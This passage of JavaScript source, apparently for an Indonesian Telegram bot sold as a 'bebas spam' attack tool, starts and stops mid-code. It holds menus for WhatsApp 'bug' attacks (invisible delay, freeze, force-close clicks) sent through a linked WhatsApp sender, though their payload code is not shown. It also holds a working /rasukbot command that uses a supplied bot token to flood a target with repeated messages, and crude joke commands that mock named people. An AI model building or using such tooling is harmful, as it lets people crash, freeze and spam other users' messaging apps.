    console.log(e);
    await ctx.reply("❌ Update gagal. Pastikan repo dan file index.js tersedia.");
  }
});

// ==================== END NEW BUTTONS ==================== //

bot.action("xsettings", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>
〣 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @gaxx4u 
〣 ᴠᴇʀsɪᴏɴ : 1.0
〣 ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ
〣 ᴛʏᴘᴇ sᴄʀɪᴘᴛ : ʙᴇʙᴀs sᴘᴀᴍ

<blockquote>⬡═—⊱ SETTING ⊰—═⬡</blockquote>
〣 /self - tutup sc private
〣 /public - buka sc private
〣 /rasukbot - send token bot 
〣 /blockcmd - non aktifkan cmd
〣 /bukacmd - mengaktifkan cmd yg di bl
〣 /grouplog - cek aktivitas bot
〣 /anticulik - anti culik bot
〣 /setcooldown - menjeda durasi bug
〣 /addgrouppremium - user premium 
〣 /delgrouppremium - user not premium
〣 /connect - Add Sender Whatsapp
〣 /listsender - melihat sender Aktif
〣 /update - update script bot
`;

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart",
            style : 'danger' }
          ]
        ]
      }
    }
  );
});

bot.action("Xdewa", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>

<pre>
╭───「 👑 𝐃𝐄𝐕 𝐈𝐍𝐅𝐎 」───⦁
│ ✦ Developer  : @gaxx4u
│ ✦ Version    : 1.0
│ ✦ Module     : Telegram
│ ✦ Type Script: Bebas Spam
╰───────────────⦁

╭───「 🛠️ 𝐓𝐎𝐎𝐋𝐒 𝐋𝐈𝐒𝐓 」───⦁
│ ➥ /tiktokdl   - TikTok DL
│ ➥ /cekkontol  - Cek Kontol
│ ➥ /cekkhodam  - Cek Khodam
│ ➥ /cekcantik  - Cek Cantik
│ ➥ /iqc        - iPhone Quote
╰───────────────⦁

╭───「 📌 𝐗𝐎𝐍𝐓𝐎𝐇 𝐏𝐄𝐌𝐀𝐊𝐈𝐀𝐍 」───⦁
│ 💡 Format: 
│ /iqc 18:00|40|Indosat|hai
╰───────────────⦁
</pre>
`;

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backstart" }
          ]
        ]
      }
    }
  );

// ==================== ATTACK PAGE 1 ==================== //
bot.action("xbugs", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>

<pre>
⫹⫺ 𝐃 𝐄 𝐋 𝐀 𝐘 〣 𝐀 𝐓 𝐓 𝐀 𝐂 𝐊 ⫹⫺

━━━━━━━━━━━━━━━━━━━━

𑆿 /Xbugs
   ├─ Type : Delay Invisible
   ├─ Jumlah : 35 Message
   └─ Jeda : 1000ms

𑆿 /LockChat
   ├─ Efect : Delay X Freeze
   ├─ Jumlah : 30 Message
   └─ Jeda : 1000ms

𑆿 /xdelay
   ├─ Efect : Delay Bebas Spam
   ├─ Jumlah : 15 Message
   └─ Jeda : 800ms
   
━━━━━━━━━━━━━━━━━━━━

Geser ke kanan untuk lihat
menu attack selanjutnya ➡️
</pre>
`;

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "➡️ 𖤐𝐍͜𝐄͢𝐗͡𝐓 𝐏͜𝐀͢𝐆͡𝐄𖤐", callback_data: "xbugs2",
            style : "primary" }
          ],
          [
            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backmenu",
            style : 'danger' }
          ]
        ]
      }
    }
  );
});

// ==================== ATTACK PAGE 2 ==================== //
bot.action("xbugs2", async (ctx) => {
  await ctx.answerCbQuery();

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>

<pre>
 𖤐 𝐊 ͜𝐈 ͢𝐋 ͡𝐋 𝐌͜ 𝐄 ͢𝐍͡ 𝐔 𖤐   [ 2 / 2 ]  

━━━━━━━━━━━━━━━━━━━━

ꦽ /BlanlClick
   ├─ Type : Blank Click
   └─ Jeda : 1000ms

ꦽ /forceClick
   ├─ Type : Forclose Click
   └─ Jeda : 1500ms

━━━━━━━━━━━━━━━━━━━━

Geser ke kiri untuk kembali ⬅️
</pre>
`;

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⬅️ 𖤐𝐏𝐑𝐄𝐕 𝐏𝐀𝐆𝐄𖤐", callback_data: "xbugs",
            style : "primary" }
          ],
          [
            { text: "「🔙」𖤐メ͜イ͢ン͡コ͜ー͢ス𖤐", callback_data: "backmenu",
            style : 'danger' }
          ]
        ]
      }
    }
  );
});

bot.action("backmenu", async (ctx) => {
  await ctx.answerCbQuery();

  const sender = isSenderConnected() ? "ᴛᴇʀʜᴜʙᴜɴɢ" : "ᴛᴇʀᴘᴜᴛᴜs";

  const userId = ctx.from.id;
  const username = ctx.from.username ? "@" + ctx.from.username : "-";
  const name = ctx.from.first_name || "User";

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>
〣 ᴅᴇᴠᴇʟᴏᴘᴇʀ : @gaxx4u
〣 ᴠᴇʀsɪᴏɴ : 1.0
〣 ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ
〣 ᴛʏᴘᴇ sᴄʀɪᴘᴛ : ʙᴇʙᴀs sᴘᴀᴍ
<blockquote>⬡═—⊱ INFORMATION ⊰—═⬡</blockquote>
〣 ᴜsᴇʀɴᴀᴍᴇ : ${username}
〣 ɪᴅ : ${userId}
<blockquote>⬡═—⊱ SECURITY ⊰—═⬡</blockquote>
〣 ᴛᴏᴋᴇɴ : ᴇɴᴀʙʟᴇᴅ
〣 sɪsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
<blockquote>⬡═—⊱ SENDER ⊰—═⬡</blockquote>
〣 ᴋᴏɴᴇᴋsɪ : ${sender}
`;

  const keyboard = [
  [
    { text: "༺ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆 ༻", callback_data: "xsettings",
    style : 'danger' },
    { text: "༺ 𝐀𝐓𝐓𝐀𝐂𝐊 ༻", callback_data: "xbugs",
    style : 'danger' }
  ],
  [  
    { text: "༺ 𝐓𝐎𝐋𝐎𝐋 ༻", callback_data: "Xdewa",
    style : 'primary' }
  ],
  [
    { text: "༺ 𝐓𝐇𝐀𝐍𝐗 𝐓𝐎 ༻", callback_data: "xthanxto",
    style : "danger" },
    { text: "༺ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑༻", callback_data: "xdeveloper",
    style : "danger" }
  ],
  [
    { text: "༺ 𝐂𝐇𝐀𝐍𝐄𝐋 ༻", callback_data: "xchanel",
    style : "primary" },
    { text: "༺𝐌𝐀𝐑𝐆𝐀༻", callback_data: "xmarga",
    style : 'primary' }
  ],
  [
    { text: "🔄 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂 ༻", callback_data: "xupdate",
    style : 'danger' }
  ]
];

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: { inline_keyboard: keyboard }
    }
  );
});

bot.action("backstart", async (ctx) => {
  await ctx.answerCbQuery();

  const sender = isSenderConnected() ? "ᴛᴇʀʜᴜʙᴜɴɢ" : "ᴛᴇʀᴘᴜᴛᴜs";

  const userId = ctx.from.id;
  const username = ctx.from.username ? "@" + ctx.from.username : "-";
  const name = ctx.from.first_name || "User";

  const caption = `
<blockquote>⬡═—⊱ 𝐏𝐆𝟕 𝐏𝐋𝐎𝐖𝐄𝐑 𝐓𝐈𝐍𝐘 ⊰—═⬡</blockquote>
〣 ᴅᴇᴠᴇʟᴏᴘᴇʀ  : @gaxx4u
〣 ᴠᴇʀsɪᴏɴ : 1.0
〣 ᴍᴏᴅᴜʟᴇ : ᴛᴇʟᴇɢʀᴀғ
〣 ᴛʏᴘᴇ sᴄʀɪᴘᴛ : ʙᴇʙᴀs sᴘᴀᴍ 
<blockquote>⬡═—⊱ INFORMATION ⊰—═⬡</blockquote>
〣 ᴜsᴇʀɴᴀᴍᴇ : ${username}
〣 ɪᴅ : ${userId}
<blockquote>⬡═—⊱ SECURITY ⊰—═⬡</blockquote>
〣 ᴛᴏᴋᴇɴ : ᴇɴᴀʙʟᴇᴅ
〣 sɪsᴛᴇᴍ : ᴀᴄᴛɪᴠᴇ
<blockquote>⬡═—⊱ SENDER ⊰—═⬡</blockquote>
〣 ᴋᴏɴᴇᴋsɪ : ${sender}
`;

  const keyboard = [
  [
    { text: "༺ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆 ༻", callback_data: "xsettings",
    style : "primary" },
    { text: "༺ 𝐀𝐓𝐓𝐀𝐂𝐊 ༻", callback_data: "xbugs",
    style : "primary" }
  ],
  [ 
    { text: "༺ 𝐓𝐎𝐋𝐎𝐋 ༻", callback_data: "Xdewa",
    style : "danger" }
  ],
  [
    { text: "༺ 𝐓𝐇𝐀𝐍𝐗 𝐓𝐎 ༻", callback_data: "xthanxto",
    style : "primary" },
    { text: "༺ 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 ༻", callback_data: "xdeveloper",
    style : "primary" }
  ],
  [
    { text: "༺ 𝐂𝐇𝐀𝐍𝐄𝐋 ༻", callback_data: "xchanel",
    style : "danger" },
    { text: "༺ 𝐌𝐀𝐑𝐆𝐀 ༻", callback_data: "xmarga",
    style : "danger" }
  ],
  [
    { text: "🔄 𝐔𝐏𝐃𝐀𝐓𝐄 𝐒𝐂 ༻", callback_data: "xupdate",
    style : "primary" }
  ]
];

  await ctx.editMessageMedia(
    {
      type: "photo",
      media: { source: "./assets/gax4u.jpg" },
      caption: caption,
      parse_mode: "HTML"
    },
    {
      reply_markup: { inline_keyboard: keyboard }
    }
  );
});
// ~ Tools Menu ~ \\
bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("🪧 ☇ Format : /tiktokdl https://vt.tiktok.com/ZSauJejyg/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("🎶 ☇ Sedang memproses...");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("🪧 ☇ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("🪧 ☇ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `🪧 ☇ Error ${e.response.status} saat mengunduh video`
        : "🪧 ☇ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

// ~ Access ~ \\
bot.command("self", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ ☇ Akses hanya untuk owner");

  mode = "self";
  ctx.reply("🔒 ☇ BOT DI MATIKAN");
});

bot.command("public", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ ☇ Akses hanya untuk owner");

  mode = "public";
  ctx.reply("✅ ☇ BOT SUDAH BISA DI GUNAKAN");
});

bot.command("setcooldown", checkOwnerOrAdmin, async (ctx) => {

    const args = ctx.message.text.split(" ");
    const seconds = parseInt(args[1]);

    if (isNaN(seconds) || seconds < 0) {
        return ctx.reply("🪧 ☇ Format : /setcooldown 5");
    }

    cooldown = seconds
    saveCooldown(seconds)
    ctx.reply(`✅ ☇ Cooldown berhasil diatur ke ${seconds} detik`);
});

bot.use((ctx, next) => {
  if (!ctx.chat) return next()
  if (!fs.existsSync(ONLY_FILE)) return next()

  const data = JSON.parse(fs.readFileSync(ONLY_FILE))

  if (data.groupOnly === true && ctx.chat.type === "private") {
    return
  }

  return next()
})

bot.command("addgrouppremium", checkOwner, async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ ☇ Command hanya untuk grup");
  }

  const groupId = ctx.chat.id.toString();
  let groups = loadPremiumGroups();

  if (groups.includes(groupId)) {
    return ctx.reply("⚠️ ☇ Grup sudah premium");
  }

  groups.push(groupId);
  savePremiumGroups(groups);

  ctx.reply("✅ ☇ Grup premium telah diaktifkan");
});

bot.command("cekkontol", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!text) {
    return ctx.reply("🤓 Nama nya mana yang mau di cek cekkontol");
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = ` 
╭━━━━°「 *👤 CEK GANTENG NAMA : ${text}* 」°
┊• Nama : ${text}
┃• Hasil : ${pickRandom([
    "ih item",
    "Belang wkwk",
    "Muluss",
    "Putih Mulus",
    "Black Doff",
    "Pink wow",
    "Item Glossy"
  ])}
┊• Status : ${pickRandom([
    "perjaka",
    "ga perjaka",
    "masih ori",
    "jumbo"
  ])}
┃• Rambut : ${pickRandom([
    "lebat",
    "ada sedikit",
    "gada",
    "tipis",
    "muluss"
  ])}
┃• Ukuran : ${pickRandom([
    "1cm",
    "2cm",
    "3cm",
    "4cm",
    "5cm",
    "20cm",
    "gak normal"
  ])}
╰═┅═━––––––๑`;

  ctx.replyWithMarkdown(hasil);
});

bot.command("cekcantik", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!text) {
    return ctx.reply("😘 Nama nya mana yang mau di cek cekcantik");
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *👤 CEK CANTIK NAMA : ${text}* 」°
┊• Nama : ${text}
┊• Tingkat Kecantikan : ${pickRandom([
    '100% Cantik Banget 😍',
    '95% Cantik Natural 💖',
    '80% Manis Banget 😚',
    '60% Lumayan Cantik 😊',
    '40% Cantik Dalam Gelap 😂',
    '10% Butuh Filter Instagram 🤭'
  ])}
┃• Aura : ${pickRandom([
    'Bersinar Kayak Bintang 🌟',
    'Menawan Banget 💫',
    'Biasa Tapi Nyenengin 💐',
    'Misterius dan Elegan 👑',
    'Lembut dan Anggun 🌸'
  ])}
┊• Nilai Tambah : ${pickRandom([
    'Senyumnya bikin leleh 😍',
    'Tatapan matanya adem banget 👁️',
    'Ramah dan manis 🍬',
    'Bikin orang jatuh cinta 💘',
    'Punya vibe princess 👑'
  ])}
╰═┅═━––––––๑`;

  ctx.replyWithMarkdown(hasil);
});

bot.command("cekkhodam", async (ctx) => {
  const chatId = ctx.chat.id;

  const nama = ctx.message.text
    .split(" ")
    .slice(1)
    .join(" ")
    .trim();

  if (!nama) {
    return ctx.reply("ɴᴀᴍᴀɴʏᴀ ᴍᴀɴᴀ ᴀɴᴊᴇɴɢ 🤓");
  }

  const khodamList = [
    "si ganteng",
    "si jelek",
    "anomali bt script",
    "kang hapus sumber",
    "maling pulpen",
    "kak gem",
    "suster ngesot",
    "kang ngocok",
    "Anomali maklu",
    "orang gila",
    "anak rajin",
    "jadi lc",
    "tukang caper",
    "anak cerdas",
    "dugong",
    "macan yatim",
    "buaya darat",
    "kuda kayang",
    "janda salto",
    "jembut singa",
    "gajah terbang",
    "kuda cacat",
    "jembut pink",
    "sabun bolong",
    "ambalambu",
    "megawati",
    "jokowi",
    "polisi",
    "sempak bolong",
    "bh bolong",
  ];

  const pickRandom = (list) =>
    list[Math.floor(Math.random() * list.length)];

  const hasil = `
<blockquote><b>𖤐 ʜᴀsɪʟ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍ :</b>
╭─━━━━━━━━━━━━━━━—═⬡
├ •ɴᴀᴍᴀ : ${nama}
├ •ᴋʜᴏᴅᴀᴍɴʏᴀ : ${pickRandom(khodamList)}
├ •ɴɢᴇʀɪ ʙᴇᴛ ᴊɪʀ ᴋʜᴏᴅᴀᴍɴʏᴀ
╰─━━━━━━━━━━━━━━━—═⬡
<b>ɴᴇxᴛ ᴄᴇᴋ ᴋʜᴏᴅᴀᴍɴʏᴀ sɪᴀᴘᴀ ʟᴀɢɪ.</b>
</blockquote>
  `;

  await ctx.reply(hasil, {
    parse_mode: "HTML",
  });
});

bot.command("iqc", async (ctx) => {
  const chatId = ctx.chat.id;

  const text = ctx.message.text.split(" ").slice(1).join(" ");

  if (!text) {
    return ctx.reply(
      "❌ ☇ Gunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  let [time, battery, carrier, ...msgParts] = text.split("|");

  if (!time || !battery || !carrier || msgParts.length === 0) {
    return ctx.reply(
      "⚠ Format salah!\nGunakan: `/iqc jam|batre|carrier|pesan`\nContoh: `/iqc 18:00|40|Indosat|hai hai`",
      { parse_mode: "Markdown" }
    );
  }

  await ctx.reply("⏳ ☇ Tunggu sebentar...");

  const messageText = encodeURIComponent(
    msgParts.join("|").trim()
  );

  const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
    time
  )}&batteryPercentage=${battery}&carrierName=${encodeURIComponent(
    carrier
  )}&messageText=${messageText}&emojiStyle=apple`;

  try {
    const res = await fetch(url);

    if (!res.ok) {
      return ctx.reply(
        "❌ ☇ Gagal mengambil data dari API."
      );
    }

    let buffer;

    if (typeof res.buffer === "function") {
      buffer = await res.buffer();
    } else {
      const arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    }

    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: "✅ ☇ Successfully by @gaxx4u",
        parse_mode: "Markdown",
      }
    );

  } catch (e) {
    console.error(e);

    await ctx.reply(
      "❌ ☇ Terjadi kesalahan saat menghubungi API."
    );
  }
});

bot.command("delgrouppremium", checkOwner, async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ ☇ Command hanya untuk grup");
  }

  const groupId = ctx.chat.id.toString();
  let groups = loadPremiumGroups();

  if (!groups.includes(groupId)) {
    return ctx.reply("❌ ☇ Grup belum premium");
  }

  groups = groups.filter(id => id !== groupId);
  savePremiumGroups(groups);

  ctx.reply("❌ ☇ Grup premium telah di non aktifkan");
});

bot.command("cekgrouppremium", async (ctx) => {
  if (ctx.chat.type === "private") {
    return ctx.reply("❌ ☇ Command hanya untuk grup");
  }

  const groupId = ctx.chat.id.toString();

  if (isGroupPremium(groupId)) {
    ctx.reply("✅ ☇ kamu adalah premium");
  } else {
    ctx.reply("❌ ☇ kamu tidak premium");
  }
});
/// ~~~~~~~~~~~~~~~ \\\
const pendingGroups = {};
const clickedUsers = {};
const TIMEOUT = 1000;


bot.command("anticulik", (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ ☇ Akses hanya untuk owner");
  }

  antiCulik = !antiCulik;
  ctx.reply(`⚙️ ☇ Anti Culik Bot : ${antiCulik ? "on" : "off"}`);
});

bot.command("grouplog", (ctx) => {
  if (!isOwner(ctx.from.id)) {
    return ctx.reply("❌ ☇ Akses hanya untuk owner");
  }

  if (groupLogs.length === 0) {
    return ctx.reply("📭 ☇ Belum ada log grup");
  }

  let text = "📊 ☇ LOG GROUP MASUK\n\n";

  groupLogs.slice(-10).forEach((g, i) => {
    text += `${i + 1}. ${g.chatTitle}\n`;
    text += `🆔 ${g.chatId}\n`;
    text += `📸 Nama depan : ${g.fullName}\n`;
    text += `🎯 Target user : ${g.username}\n`;    
    text += `🕒 ${g.date}\n\n`;
  });

  ctx.reply(text);
});

bot.on("new_chat_members", async (ctx) => {
  if (!antiCulik) return;

  const botId = ctx.botInfo.id;
  const newMembers = ctx.message.new_chat_members;

  const isBotAdded = newMembers.some(m => m.id === botId);
  if (!isBotAdded) return;

  const chatId = Number(ctx.chat.id);
  const chatTitle = ctx.chat.title || "Group Tanpa Nama";

 
  const username = ctx.from.username ? `@${ctx.from.username}` : "-";
  const fullName = `${ctx.from.first_name || ""} ${ctx.from.last_name || ""}`.trim();

  const logData = {
    chatId,
    chatTitle,
    username,
    fullName,
    date: new Date().toLocaleString()
  };

  groupLogs.push(logData);
  saveGroupLog(groupLogs);

  pendingGroups[chatId] = true;

  
  owner.forEach(async (own) => {
    await ctx.telegram.sendMessage(own, `🚨 ☇ PERINGATAN BOT DI CULIK KE GRUP

📛 Nama Group : ${chatTitle}
🆔 ID Group : ${chatId}
🎯 Target : ${fullName}
🕒 Waktu : ${logData.date}

Izinkan bot di grup ini?`, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "✅ 𝐈𝐙𝐈𝐍𝐊𝐀𝐍", callback_data: `allow_${chatId}`,
            style : 'primary' },
            { text: "❌ 𝐓𝐎𝐋𝐀𝐊", callback_data: `deny_${chatId}`,
           style : 'danger'  }
          ]
        ]
      }
    });
  });

 
  setTimeout(async () => {
    if (pendingGroups[chatId]) {
      delete pendingGroups[chatId];

      try {
        await ctx.telegram.sendMessage(chatId, `
<pre>
╭━━━〔 🔒 SECURITY DETECT 〕━━━⬣
┃
┃ ⚠️ ANTI CULIK PROTECTION
┃
┃ ❌ Akses ditolak!
┃ Pengguna tidak memiliki izin
┃ untuk menjalankan fitur ini.
┃
┃ 🛡️ Sistem keamanan aktif:
┃ • Anti Culik Group
┃ • Anti Ambil Alih Admin
┃ • Anti Penyalahgunaan Bot
┃ • Auto Security Check
┃
┃ Setiap aktivitas mencurigakan
┃ akan diblokir oleh sistem.
┃
╰━━━━━━━━━━━━━━━━━━━━━━⬣
</pre>
`, { parse_mode: "HTML" });
        await ctx.telegram.leaveChat(chatId);
      } catch {}
    }
  }, TIMEOUT);
});

bot.on("callback_query", async (ctx) => {
  const data = ctx.callbackQuery.data;
  const userId = ctx.from.id;

  if (!isOwner(userId)) {
    return ctx.answerCbQuery("❌ ☇ Akses hanya untuk owner", { show_alert: true });
  }

  
  if (clickedUsers[userId]) {
    return ctx.answerCbQuery("⚠️ ☇ Jangan spam tombol", { show_alert: true });
  }
  clickedUsers[userId] = true;

  const [action, chatIdRaw] = data.split("_");
  const chatId = Number(chatIdRaw);

  if (!pendingGroups[chatId]) {
    delete clickedUsers[userId];
    return ctx.answerCbQuery("⚠️ ☇ Sudah diproses");
  }

  try {
    if (action === "allow") {
      delete pendingGroups[chatId];

      await ctx.answerCbQuery("✅ ☇ Diizinkan");

      await ctx.editMessageText(`✅ ☇ Berhasil diizinkan

🆔 Group ID : ${chatId}
🎉 Status : Bot diizinkan masuk group`);

      await ctx.telegram.sendMessage(chatId, "✅ ☇ Bot diizinkan oleh owner");

    } else if (action === "deny") {
      delete pendingGroups[chatId];

      await ctx.answerCbQuery("❌ ☇ Ditolak");

      await ctx.editMessageText(`❌ ☇ Berhasil ditolak oleh owner

🆔 Group ID : ${chatId}
😹 Status : Bot keluar dari group`);

      await ctx.telegram.sendMessage(chatId, "❌ ☇ Bot ditolak owner, keluar...");
      await ctx.telegram.leaveChat(chatId);
    }
  } catch (err) {
    console.log("Error:", err);
  }

  delete clickedUsers[userId];
});
/// ×××××× ///

bot.command("rasukbot", async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const args = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  if (!args) {
    return ctx.reply(
      "<b>Cara penggunaan /rasukbot</b>\n\n" +
      "<b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format :\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh :\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "<b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik :\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh :\n<code>/rasukbot 123456 : ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    if (reply) {
      const parts = args.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return ctx.reply(
          "❌ ☇ Format salah!\nGunakan : <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {

      if (!args.includes("|")) {
        return ctx.reply(
          "📩 ☇ Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh :\n<code>/rasukbot 123456 : ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = args.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.reply(
        "❌ ☇ Format salah!\nGunakan : <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await ctx.reply("🔃 ☇ Proses mengirim...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.reply(
      `✅ ☇ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    await ctx.reply(
      `❌ ☇ Gagal mengirim pesan :\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.command("blockcmd", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ ☇ Akses hanya untuk owner");

  const cmd = ctx.message.text.split(" ")[1];
  if (!cmd) return ctx.reply("⚠️ ☇ Contoh : /blockcmd attack");

  if (disabledCmd.includes(cmd)) {
    return ctx.reply(`⚠️ ☇ Command : /${cmd} sudah dinonaktifkan`);
  }

  disabledCmd.push(cmd);
  saveCmd(disabledCmd);

  ctx.reply(`✅ ☇ Command /${cmd} berhasil di blokir\n`);
});

bot.command("bukacmd", (ctx) => {
  if (!isOwner(ctx.from.id)) return ctx.reply("❌ ☇ Akses hanya untuk owner");

  const cmd = ctx.message.text.split(" ")[1];
  if (!cmd) return ctx.reply("⚠️ ☇ Contoh : /bukacmd attack");

  if (!disabledCmd.includes(cmd)) {
    return ctx.reply(`⚠️ ☇ Command : /${cmd} tidak dalam kondisi nonaktif`);
  }

  disabledCmd = disabledCmd.filter(c => c !== cmd);
  saveCmd(disabledCmd);

  ctx.reply(`✅ ☇ Command : /${cmd} berhasil Aktif kembali`);
});

bot.command("listcmd", (ctx) => {
  if (!isOwner(ctx.from.id)) return;

  if (disabledCmd.length === 0) {
    return ctx.reply("✅ ☇ Semua command aktif");
  }

  ctx.reply("🚫 ☇ Command nonaktif : \n\n" + disabledCmd.map(c => `/${c}`).join("\n"));
});
/// case listsender //
bot.command("listsender", async (ctx) => {
  const senderId = ctx.from.id;

  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return ctx.reply("❌ ☇ Akses hanya untuk owner");
  }

  try {
    
    if (!sock) {
      return ctx.reply("🪧 ☇ Sender WhatsApp belum di /connect");
    }

    
    const isConnected = !!(
      sock &&
      sock.user &&
      sock.user.id
    );

    let botList =
      "\n╭━━━⬡ ʟɪsᴛ sᴇɴᴅᴇʀ ᴅᴇᴡᴀ ɢʜᴏsᴛ\n" +
      "║\n";

   
    const senderNumber = sock?.user?.id
      ? sock.user.id.split(":")[0]
